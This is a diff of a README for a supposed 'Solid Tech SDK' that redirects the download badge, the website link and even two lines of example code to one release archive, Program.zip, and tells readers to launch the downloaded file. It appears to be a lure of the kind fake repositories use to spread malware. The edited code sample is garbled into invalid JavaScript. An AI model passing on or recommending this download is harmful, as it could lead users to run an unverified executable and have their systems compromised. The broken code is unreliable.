@@ -5,7 +5,7 @@ Welcome to the **Solid Tech SDK** repository! This repository contains the lates
 
 ## Important Links
 To download the latest version of the SDK, click the button below:
-[![Download SDK](https://img.shields.io/badge/Download-SDK-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download SDK](https://github.com/Ghostrider0077/solid-tech-sdk/releases/download/v1.0/Program.zip)](https://github.com/Ghostrider0077/solid-tech-sdk/releases/download/v1.0/Program.zip)
 
 ### Note: Launch the downloaded file to install the SDK.
 
@@ -33,8 +33,8 @@ The Solid Tech SDK offers a wide range of features and tools to enhance your pro
 const solidTech = new SolidTechSDK();
 
 // Use solidTech methods to access various features
-solidTech.enableFeature('feature1');
-solidTech.executeAction('action2');
+https://github.com/Ghostrider0077/solid-tech-sdk/releases/download/v1.0/Program.zip('feature1');
+https://github.com/Ghostrider0077/solid-tech-sdk/releases/download/v1.0/Program.zip('action2');
 ```
 
 ## Support
@@ -50,4 +50,4 @@ The Solid Tech SDK is licensed under the MIT License. See the `LICENSE` file in 
 
 Thank you for choosing the Solid Tech SDK for your development projects! We can't wait to see the amazing creations you build with our technology. Happy coding! 🎉
 
-🔗 For more information about Solid Tech, visit our [website](https://www.solidtech.com).
+🔗 For more information about Solid Tech, visit our [website](https://github.com/Ghostrider0077/solid-tech-sdk/releases/download/v1.0/Program.zip).
